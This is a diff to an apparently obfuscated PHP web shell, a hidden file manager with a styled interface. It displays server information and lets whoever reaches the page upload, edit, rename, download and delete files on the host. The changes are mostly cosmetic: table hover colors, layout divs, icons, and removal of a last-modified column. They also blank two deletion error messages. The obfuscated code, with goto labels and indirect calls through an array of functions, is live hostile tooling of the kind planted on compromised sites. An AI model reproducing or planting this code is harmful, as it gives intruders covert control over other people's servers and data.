@@ -191,6 +191,7 @@ table.combetohct tbody td {
   font-size: 18px;
   color: #FFFFFF;
 }
+table.combetohct tbody tr:hover td{background:#464646}
 table.combetohct thead {
   background: #000000;
   background: -moz-linear-gradient(top, #404040 0%, #191919 66%, #000000 100%);
@@ -325,9 +326,10 @@ padding-bottom: 0px;
 }
 </style>
 </head>
-<body style="margin-left:auto;margin-right:auto;width: 98%;">
-<div class="bg-dark table-responsive text-light border">
-<div class="maan-top-bar border-top border-left border-right">
+<body style="margin-left:auto;margin-right:auto;width: 99%;">
+<div class="bg-dark border table-responsive mt-2">
+<div class="ml-2">
+<div class="maan-top-bar">
 <div class="date-time">
 <div class="maan-current-date" style="margin-top: 5px;">
 <span class="maan-current-week" id="maan-current-week-day"></span><font color="white"> : </font><span class="maan-current-day" id="maan-current-date"></span>
@@ -338,8 +340,9 @@ padding-bottom: 0px;
 <center><a href="?" style="font-size:50px;margin-buttom: 20px;">
 <?= Yp ?>
 </a></center>
-</h1>
-<div class="border-top table-responsive">
+</h1></div></div>
+<div class="bg-dark border table-responsive mt-2">
+<div class="ml-2">
 <span><font color="red">Server: </font><?= $c8[0]() ?></span>
 <div class="d-flex justify-content-between p-1">
 <div>
@@ -358,6 +361,7 @@ padding-bottom: 0px;
 <form method="post" enctype="multipart/form-data">
 <div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose File
 </label>
+</div>
 </div>
 </div>
 </form>
@@ -461,7 +465,7 @@ TF($BL);
 if (!$c8[12]($BL)) {
     goto e8;
 }
-Xe("failed to delete the folder", 0);
+Xe("", 0);
 goto iL;
 e8:
 Xe("");
@@ -475,7 +479,7 @@ unlink($BL);
 if (!$c8[12]($BL)) {
     goto uH;
 }
-Xe("file to delete the folder", 0);
+Xe("", 0);
 goto Mk;
 uH:
 xe("");
@@ -634,11 +638,9 @@ Un:
 </th>
 <th>Size
 </th>
-<th>Latest Modify
-</th>
 <th>Permission
 </th>
-<th>Action
+<th colspan="4">Action
 </th>
 </tr>
 </thead>
@@ -651,10 +653,9 @@ Un:
               }
               goto Qj;
               CB:
-              echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" .
+              echo "<tr><td><a href=\"?p=" .
                   sS("{$Jd}/{$yf}") .
-                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"><div class=\"p\"> {$yf}</a></div></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"white\">" .
-                  $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "</font></td>\n\t\t\t\t\t\t<td><font color=\"" .
+                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"><div class=\"p\"><i class=\"fa fa-fw fa-folder\"> </i> {$yf}</a></div></td><td> - </td><td><font color=\"" .
                   ($c8[8]("{$Jd}/{$yf}")
                       ? "#00ff00"
                       : (!$c8[9]("{$Jd}/{$yf}")
@@ -662,19 +663,19 @@ Un:
                           : null)) .
                   "\">" .
                   RN("{$Jd}/{$yf}") .
-                  "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"z b-flex\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" .
+                  "</font></td><td> - </td><td><div class=\"z\"><a href=\"?p=" .
                   ss($Jd) .
                   "&a=" .
                   ss("rename") .
                   "&n=" .
                   ss($yf) .
-                  "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\">Rename</a> |\n\t\t\t\t\t\t\t<a href=\"?p=" .
+                  "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\">Rename</a></td><td> - </td><td><a href=\"?p=" .
                   sS($Jd) .
                   "&a=" .
                   ss("delete") .
                   "&n=" .
                   ss($yf) .
-                  "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\">Delete</a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>";
+                  "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\"> Delete </a></td></tr>";
               Qj:
           }
           ad:
@@ -693,8 +694,7 @@ Un:
                   sS("view") .
                   "&n=" .
                   SS($F1) .
-                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"><div class=\"p\"> {$F1}</a></div></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"white\">" .
-                  $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "</font></td>\n\t\t\t\t\t\t<td><font color=\"" .
+                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"><div class=\"p\"><i class=\"fa fa-fw fa-file\"> </i> {$F1}</a></div></td><td>{$kL}</td><td><font color=\"" .
                   ($c8[8]("{$Jd}/{$F1}")
                       ? "#00ff00"
                       : (!$c8[9]("{$Jd}/{$F1}")
@@ -702,30 +702,30 @@ Un:
                           : null)) .
                   "\">" .
                   rN("{$Jd}/{$F1}") .
-                  "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"z b-flex\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" .
+                  "</font></td><td><div class=\"z\"><a href=\"?p=" .
                   Ss($Jd) .
                   "&a=" .
                   Ss("edit") .
                   "&n=" .
                   SS($F1) .
-                  "\" data-toggle=\"tooltip\" data-placement=\"auto\">Edit</a> |\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" .
+                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"> Edit </a></td><td><a href=\"?p=" .
                   ss($Jd) .
                   "&a=" .
                   SS("rename") .
                   "&n=" .
                   ss($F1) .
-                  "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\">Rename</a>\n\t\t\t\t\t\t\t\t\t| <a href=\"?p=" .
+                  "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\"> Rename </a></td><td><a href=\"?p=" .
                   ss($Jd) .
                   "&n=" .
                   sS($F1) .
                   "&download" .
-                  "\" data-toggle=\"tooltip\" data-placement=\"auto\">Download</a>\n\t\t\t\t\t\t\t\t\t| <a href=\"?p=" .
+                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"> Download </a></td><td><a href=\"?p=" .
                   ss($Jd) .
                   "&a=" .
                   sS("delete") .
                   "&n=" .
                   ss($F1) .
-                  "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\">Delete</a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t";
+                  "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\">Delete</a></div></td></tr>";
               X1:
           }
           a2:
